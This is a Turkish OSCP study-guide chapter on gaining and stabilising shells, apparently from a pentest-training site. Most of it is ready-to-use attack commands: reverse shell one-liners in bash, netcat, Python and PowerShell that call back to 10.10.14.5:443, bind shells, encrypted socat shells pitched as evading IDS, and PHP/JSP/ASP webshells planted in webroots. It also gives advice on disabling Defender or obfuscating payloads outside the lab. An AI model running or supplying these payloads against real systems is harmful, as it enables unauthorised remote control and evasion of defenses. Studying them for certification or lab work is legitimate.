---
layout: page
title: "Bölüm 13 — Shell'ler & Payload'lar"
oscp: true
toc: true
permalink: /oscp/13-shell-payload/
---

{% raw %}
Bu bölüm, ilk komut çalıştırma yeteneğini **kararlı bir shell'e** çevirmenin tüm
yollarını kapsar: reverse/bind shell, webshell, TTY yükseltme ve shell
kararlılaştırma. Kural: **önce geri bağlantıyı al, sonra shell'i interaktif yap.**
Yarım TTY'de `sudo`, `su`, `ssh`, metin editörleri ve Ctrl+C çalışmaz — privesc'e
başlamadan **mutlaka TTY'yi yükselt** (§13.5).

Dinleyici için **443** (veya 80) tercih et: HTTPS/HTTP trafiği firewall ve IDS'te
daha az dikkat çeker. msfvenom ile binary payload üretimi
[Bölüm 9 — İstemci & AV](/oscp/09-istemci-av/)'de.

## 13.1 Shell'i Doğrulama (hangi shell'deyim?)

```bash
ps                      # bash / sh / dash ?
env | grep SHELL
echo $0
```
```powershell
$PSVersionTable         # PowerShell sürümü
```

## 13.2 Dinleyici (Kali tarafı)

```bash
nc -lvnp 443            # -l dinle, -v verbose, -n DNS yok, -p port
rlwrap nc -lvnp 443     # rlwrap: ok tuşları + komut geçmişi (Windows shell'de çok işe yarar)
```

## 13.3 Reverse Shell'ler (hedef → Kali)

**Linux hedef:**

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.5 443 >/tmp/f
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/bash","-i"])'
```

**Windows hedef (PowerShell tek satır):**

```powershell
powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('10.10.14.5',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()"
```

> PowerShell payload "malicious content … blocked by antivirus" derse: Defender
> blokluyor. Lab'da `Set-MpPreference -DisableRealtimeMonitoring $true`; gerçek
> ortamda encode/obfuscate (bkz. [Bölüm 9](/oscp/09-istemci-av/)). Hazır üretici:
> [revshells.com](https://www.revshells.com/).

## 13.4 Bind Shell'ler (Kali → hedef dinler)

Hedef sana bağlanamıyorsa (NAT/firewall outbound kapalı) hedefte dinlet, sen bağlan:

```bash
# Linux hedef dinler
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
# Kali bağlanır
nc -nv 10.129.41.200 1234
```
```powershell
# Windows hedef dinler
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $l=[System.Net.Sockets.TcpListener]1234;$l.start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()
```

## 13.5 TTY Yükseltme (en kritik adım)

netcat shell'i tam interaktif TTY'ye çevirmek — privesc öncesi zorunlu:

```bash
# 1) hedefte pty spawn et
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 2) Ctrl+Z ile arka plana at
# 3) Kali'de:
stty raw -echo; fg
# 4) Enter'a bas, sonra hedefte terminali düzelt:
export TERM=xterm-256color
stty rows 50 columns 200     # Kali'de  stty size  çıktısına göre ayarla
```

Python yoksa `script`, `socat` veya alternatif pty üreticileri:

```bash
/usr/bin/script -qc /bin/bash /dev/null
```

## 13.6 socat (kararlı & şifreli shell)

```bash
# Temel reverse (nc -lvnp eşdeğeri)
# Kali:    socat TCP-L:443 -
# hedef:   socat TCP:10.10.14.5:443 EXEC:"bash -li"         (Linux)
#          socat TCP:10.10.14.5:443 EXEC:powershell.exe,pipes (Windows)

# Tam kararlı pty (TTY yükseltmeye gerek kalmaz)
# Kali:    socat TCP-L:443 FILE:`tty`,raw,echo=0
# hedef:   socat TCP:10.10.14.5:443 EXEC:"bash -li",pty,stderr,sigint,setsid,sane

# Şifreli (OPENSSL) — IDS'i atlatır
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
cat shell.key shell.crt > shell.pem
# Kali:    socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
# hedef:   socat OPENSSL:10.10.14.5:443,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

## 13.7 Kısıtlı Shell'den Kaçış (interaktif shell spawn)

Komut çalıştırabildiğin ama shell olmayan yerlerde (`sudo`/SUID binary, `find -exec`,
editör) `/bin/sh` fırlat:

```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
lua -e 'os.execute("/bin/sh")'
awk 'BEGIN {system("/bin/sh")}'
find / -exec /bin/sh \; -quit
vim -c ':!/bin/sh'          # veya vim içinde:  :set shell=/bin/sh  →  :shell
```

> Bunlar aynı zamanda **sudo/SUID privesc** kaçış teknikleridir — GTFOBins ile
> eşleştir, bkz. [Bölüm 5 — Linux Privesc](/oscp/05-linux-privesc/).

## 13.8 Webshell'ler

RCE'li bir web uygulamasında veya yazılabilir webroot'ta kalıcı komut çalıştırma:

```php
<?php system($_REQUEST["cmd"]); ?>     // URL/shell.php?cmd=id
```
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
```asp
<% eval request("cmd") %>
```

| Web Server | Varsayılan webroot |
|---|---|
| Apache | `/var/www/html/` |
| Nginx | `/usr/local/nginx/html/` |
| IIS | `C:\inetpub\wwwroot\` |
| XAMPP | `C:\xampp\htdocs\` |

```bash
# Yazılabilir webroot'a shell yaz + tetikle
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
curl 'http://TARGET/shell.php?cmd=id'
# Hazır webshell koleksiyonu:
ls /usr/share/webshells/           # php, asp, aspx, jsp, laudanum, nc
```

> Laudanum shell'lerinde kullanmadan önce **kendi IP'ni** dosyanın içine yaz.
> Webshell ile `id` çalışıyorsa hemen §13.3 reverse shell'e geç — interaktif shell
> her zaman daha kullanışlı.

## 13.9 tmux (uzun engagement'larda oturum yönetimi)

```bash
tmux                     # başlat
# prefix = Ctrl+B:  c yeni pencere, % dikey böl, " yatay böl, ok tuşları geçiş
tmux ls                  # oturumlar
tmux attach -t 0         # oturuma gir  (bağlantı koparsa shell'in hayatta kalır)
```

Reverse shell'i aldıktan ve TTY'yi yükselttikten sonra enum/privesc için
[Bölüm 4 (Win)](/oscp/04-windows-privesc/) · [Bölüm 5 (Linux)](/oscp/05-linux-privesc/),
araç taşımak için [Bölüm 12 — Dosya Transferi](/oscp/12-dosya-transferi/).

---

[← Bölüm 12](/oscp/12-dosya-transferi/) · [Bölüm 14 →](/oscp/14-yaygin-uygulamalar/)
{% endraw %}
